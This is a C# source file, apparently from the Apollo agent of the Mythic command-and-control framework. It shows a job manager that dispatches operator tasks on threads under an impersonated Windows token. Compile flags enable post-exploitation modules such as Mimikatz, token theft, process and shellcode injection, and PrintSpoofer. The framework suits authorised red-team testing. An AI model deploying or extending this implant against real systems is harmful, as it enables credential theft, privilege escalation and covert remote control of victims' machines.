#define COMMAND_NAME_UPPER

#if DEBUG
#undef JOBS
#undef JOBKILL
#undef MAKE_TOKEN
#undef STEAL_TOKEN
#undef REV2SELF
#undef GETPRIVS
#undef WHOAMI
#define MAKE_TOKEN
#define STEAL_TOKEN
#define REV2SELF
#define GETPRIVS
#define WHOAMI
#undef MIMIKATZ
#undef RUN
#undef SHELL
#undef POWERPICK
#undef PSINJECT
#undef EXECUTE_ASSEMBLY
#undef INLINE_ASSEMBLY
#undef ASSEMBLY_INJECT
#undef SHINJECT
#undef LIST_INJECTION_TECHNIQUES
#undef GET_INJECTION_TECHNIQUE
#undef SET_INJECTION_TECHNIQUE
#undef PRINTSPOOFER
#undef SPAWN
#define MIMIKATZ
#define RUN
#define SHELL
#define POWERPICK
#define PSINJECT
#define EXECUTE_ASSEMBLY
#define INLINE_ASSEMBLY
#define ASSEMBLY_INJECT
#define SHINJECT
#define LIST_INJECTION_TECHNIQUES
#define GET_INJECTION_TECHNIQUE
#define SET_INJECTION_TECHNIQUE
#define JOBKILL
#define JOBS
#define SPAWN
#define PRINTSPOOFER
#endif


using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading;
using AT = Apollo.Tasks;

namespace Apollo.Jobs
{
    public struct JobInformationLite
    {
        public int JobID;
        public int ProcessID;
        public string TaskString;
    }
    internal static class JobManager
    {
        private static List<Job> executingJobs = new List<Job>();
        private static Mutex jobMutex = new Mutex();
        private static Agent agent;

        internal static void Intitialize(Agent _agent)
        {
            agent = _agent;
        }
#if JOBS
        internal static JobInformationLite[] GetJobs()
        {
            Job[] tempJobs = null;
            List<JobInformationLite> results = new List<JobInformationLite>();
            lock (executingJobs)
            {
                tempJobs = executingJobs.ToArray();
            }

            foreach (Job j in tempJobs)
            {
                if (j.Task.command != "jobs" && j.Task.command != "jobkill")
                    results.Add(new JobInformationLite()
                    {
                        ProcessID = j.ProcessID,
                        JobID = j.JobID,
                        TaskString = j.TaskString
                    });
            }
            return results.ToArray();
        }
#endif


        internal static Tasks.ApolloTaskResponse[] GetJobOutput()
        {
            List<Tasks.ApolloTaskResponse> results = new List<Tasks.ApolloTaskResponse>();
            List<int> popIndexes = new List<int>();
            lock (executingJobs)
            {
                foreach (Job j in executingJobs)
                {
                    foreach (Tasks.ApolloTaskResponse res in j.GetOutput())
                    {
                        results.Add(res);
                    }
                    if (j.Task.completed)
                        popIndexes.Add(executingJobs.IndexOf(j));
                }
                foreach (int i in popIndexes)
                {
                    if (i < executingJobs.Count)
                    {
                        executingJobs.RemoveAt(i);
                    }
                    else
                    {
                        break;
                    }
                }
            }
            return results.ToArray();
            /*
             * //Utils.DebugUtils.DebugWriteLine("Attempting to get all messages from Queue...");
                SocksDatagram[] datagrams = Apollo.SocksProxy.SocksController.GetMythicMessagesFromQueue();
                //Utils.DebugUtils.DebugWriteLine("Got all messages from Queue!");
                bool bRet = false;
                if (datagrams.Length == 0)
                {
                    return true;
                }
                try // Try block for HTTP requests
                {
                    // Encrypt json to send to server
                    string msgId = $"{Guid.NewGuid().ToString()}";
                    Mythic.Structs.TaskResponse apfellResponse = new Mythic.Structs.TaskResponse
                    {
                        action = "post_response",
                        responses = new Apollo.Tasks.ApolloTaskResponse[] { },
                        delegates = new Dictionary<string, string>[] { },
                        socks = datagrams,
                        message_id = msgId
                    };
                    string json = JsonConvert.SerializeObject(apfellResponse);
                    if (Send(msgId, json))
                    {
                        string result = (string)Inbox.GetMessage(msgId);
                        //Utils.DebugUtils.DebugWriteLine("Got the response to sending datagrams!");
                        bRet = true;
                        //if (result.Contains("success"))
                        //    // If it was successful, return the result
                        //    bRet = true;
                    }
                    //Debug.WriteLine($"[-] PostResponse - Got response for task {taskresp.task}: {result}");
                    //throw (new Exception($"POST Task Response {taskresp.task} Failed"));
                }
                catch (Exception e) // Catch exceptions from HTTP request or retry exceeded
                {
                    bRet = false;
                }
                return bRet;*/
        }
        internal static bool AddJob(AT.Task task)
        {
            bool bRet = true;
            Job j = new Job(task);
            Thread jobThread = new Thread(() => DispatchJob(j));
            j._JobThread = jobThread;
            jobThread.SetApartmentState(ApartmentState.STA);
            lock (executingJobs)
            {
                try
                {
                    executingJobs.Add(j);
                    j.Start();
                }
                catch { bRet = false; }
            }
            return bRet;
        }

        private static void DispatchJob(Job job)
        {
            // using System.Reflection;
            // Type thisType = this.GetType();
            // MethodInfo theMethod = thisType.GetMethod(TheCommandString);
            // theMethod.Invoke(this, userParameters);
            string cmd;

            if (AT.Task.TaskMap.TryGetValue(job.Task.command, out cmd))
            {
                object[] args = { job, agent };
                var type = Type.GetType(String.Format("Apollo.CommandModules.{0}", cmd));
#if MAKE_TOKEN || STEAL_TOKEN || REV2SELF || GETPRIVS || WHOAMI
                WindowsIdentity ident = Credentials.CredentialManager.CurrentIdentity;
#endif
                try
                {
#if MAKE_TOKEN || STEAL_TOKEN || REV2SELF || GETPRIVS || WHOAMI
                    using (var impersonated = ident.Impersonate())
#endif
                        type.GetMethod("Execute").Invoke(agent, args);
                }
                catch (Exception ex)
                {
                    job.SetError(String.Format("Unhandled Exception: {0}\n{1}", ex.Message, ex.StackTrace));
                }
            }
            else
            {
                job.SetError(string.Format("Command \"{0}\" is not loaded.", job.Task.command));
            }
            //agent.SendResult(job);
        }

        internal static bool RemoveJob(Job j)
        {
            bool bRet = true;
            jobMutex.WaitOne();
            try
            {
                for (int i = 0; i < executingJobs.Count; i++)
                {
                    if (executingJobs[i].JobID == j.JobID)
                    {
                        executingJobs.RemoveAt(i);
                        break;
                    }
                }
            }
            catch { bRet = false; }
            finally { jobMutex.ReleaseMutex(); }
            return bRet;
        }
#if JOBKILL
        internal static bool KillJob(int jid)
        {
            bool bRet = true;
            jobMutex.WaitOne();
            try
            {
                for (int i = 0; i < executingJobs.Count; i++)
                {
                    if (executingJobs[i].JobID == jid)
                    {
                        executingJobs[i].Kill();
                        executingJobs.RemoveAt(i);
                        break;
                    }
                }
            }
            catch { bRet = false; }
            finally { jobMutex.ReleaseMutex(); }
            return bRet;
        }
#endif
    }
}
